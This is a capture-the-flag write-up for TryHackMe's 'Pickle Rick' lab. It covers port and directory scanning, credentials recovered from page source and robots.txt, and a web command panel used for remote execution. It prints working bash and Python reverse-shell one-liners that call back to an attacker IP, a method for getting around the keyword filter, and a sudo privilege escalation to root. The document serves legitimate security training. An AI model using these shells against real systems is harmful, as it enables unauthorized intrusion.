# Pickle Rick

This is the first machine in TryHackMe's "Starters" series: https://tryhackme.com/r/hacktivities/practice

I'll start with a quick preliminary nmap scan of the common ports:
`nmap -T4 10.10.215.148`
```
Nmap scan report for 10.10.215.148
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We find that among the common ports, we just have SSH and HTTP open. I'll start another scan to hopefully get more detail about these services:
`nmap -T4 -sV -sC 10.10.215.148 -p22,80`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

Checking out the website, I'll run a gobuster scan to find sub-directories:
`gobuster dir -u http://10.10.215.148:80 --wordlist /usr/share/wordlists/dirb/common.txt`
```

```
We'll start exploring the pages found from this scan:

Opening to index.html, we're greeted with this page:
![Image of index.html](attachments/01.png)
From this, it sounds like our main objective is to login to the server via SSH.
In this page's source, we find the following comment:
```HTML
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Attempting to login, we receive "Permission denied (publickey)" meaning we'll need an SSH key to login with this username. Same when attempting to login as **root**.

/robots.txt only contains the string "Wubbalubbadubdub", which is either meaningless or a potential password.

In /assets, we have several files available. Some of them are images, so we'll take a quick look with `steghide`, but couldn't find any further information.

We seem to have potential login credentials, but we don't have anywhere to use them.

Now running a more exhaustive gobuster scan with `/usr/share/wordlists/dibuster/directory-list-2.3-small.txt`, as well as another Nmap enumeration of HTTP:
`gobuster dir -u http://10.10.215.148:80 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
`nmap --script http* 10.10.215.148 -p80`

In the meantime, I continued to search manually for other pages that might be present indicated by the images in assets. One of them, portal.jpg, led to finding /portal.php which redirects to /login.php:
![Image of portal login page](attachments/02.png)

This time we don't have any useful information in the page's source, but we are able to log in to this page using `R1ckRul3s:Wubbalubbadubdub`.

Upon logging in, we have a "Command Panel" which gives us direct RCE into the webroot (/var/www/html) as the user www-data. 
![Image showing RCE through portal](attachments/03.png)

All of the other tabs visible at the top of this page deny access:
![Image showing other tabs in portal as forbidden](04.png)

We'll navigate back to /portal.php obtain a Bash reverse shell for easier enumeration:
Open a listener on the attacking machine:
`rlwrap nc -lnvp 53`
Connect to the listener from the target machine via the command panel:
`sh -i >& /dev/tcp/10.13.55.228/53 0>&1`

After a few unsuccessful attempts, I'm given this screen, indicating that there's some form of filtering that prevents us from executing these commands, including `nc` and `cat`:

![Image showing keyword filtering for the command portal](05.png)

I made some more attempts, eventually succeeding with the following Python3 command to establish the reverse shell:
`export RHOST="10.13.55.228";export RPORT=53;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`

Then we'll use our Python trick to upgrade to an interactive TTY: `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

At this point, we find that we're able to read /home/rick/'second ingredients', which gives us the second flag.

Next, assuming we're going to somehow escalate privileges to find the final flag, I notice that using sudo, we can run any command as root:
```
www-data@ip-10-10-51-251:/$ sudo -l
Matching Defaults entries for www-data on ip-10-10-51-251:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-51-251:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-51-251:/$ sudo whoami
root

```
Now using sudo, we can find that the 3rd and final flag is located in /root/3rd.txt, and cat its contents to finish the room!
